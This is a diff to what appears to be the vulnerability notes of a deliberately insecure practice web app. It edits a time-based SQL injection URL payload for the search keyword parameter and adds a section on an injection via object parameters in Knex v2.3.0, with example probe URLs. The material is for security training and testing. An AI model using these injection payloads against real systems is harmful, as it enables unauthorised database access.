@@ -15,7 +15,21 @@ When searching a post, `keyword` search param is not escaped.
 ```
 
 ```
-http://localhost:4000/search?keyword=a%25%27+AND+pg_sleep%285%29+%7C%7C+%27a%27+LIKE+%27%25a
+http://localhost:4000/search?keyword=a%25%27%20AND%20SLEEP(5)%20AND%20%27a%27%20LIKE%20%27%25a
+```
+
+### Limited SQLi
+
+Knex v2.3.0 causes it.
+
+When db parameter is an object, this version of knex directly stringify the object into JSON string and directly send to DB without any validation or sanitization.
+
+```
+// Will throw an error (You can see json string is directly injected to the sql query from the error message)
+http://localhost:4000/search?user_id[non_exist_param]=test
+
+// Won't throw an error
+http://localhost:4000/search?user_id[name]=test
 ```
 
 ## IDOR
